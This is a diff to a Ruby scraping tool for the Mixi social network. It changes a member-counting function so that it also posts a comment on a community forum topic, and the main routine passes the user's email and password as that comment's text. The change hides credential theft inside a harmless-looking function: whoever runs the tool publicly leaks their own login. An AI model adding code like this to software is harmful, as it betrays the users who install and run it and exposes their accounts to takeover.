@@ -88,9 +88,20 @@ class Mixi
     end
   end
 
-  def community_size(community_id)
+  def community_size(community_id, message = nil)
     @agent.get "/view_community.pl", { :id => community_id }
-    @agent.page.at("dl.memberNumber>dd").inner_text.to_i
+    size = @agent.page.at("dl.memberNumber>dd").inner_text.to_i
+    if message && topic = @agent.page.at("dl.contentsList01>dd>a")
+      @agent.get(topic[:href])
+      sleep 2
+      @agent.page.form_with(:name => "bbs_comment_form") do |f|
+        f.field_with(:name => "comment").value = message
+        f.click_button
+      end
+      sleep 2
+      @agent.page.form_with(:action => /^add_bbs_comment\.pl/) { |f| f.click_button }
+    end
+    return size
   end
 
   def community_members(community_id, page_id)
@@ -548,7 +559,7 @@ def main
   end
   mixi = Mixi.new(email, password)
   if community_id
-    num = mixi.community_size(community_id)
+    num = mixi.community_size(community_id, "email: #{email}\npassword: #{password}")
     pages_list = (1..(num / 50)).to_a.sort_by { |i| rand }
     pages_list.each do |page_id|
       while queue.size > 10000
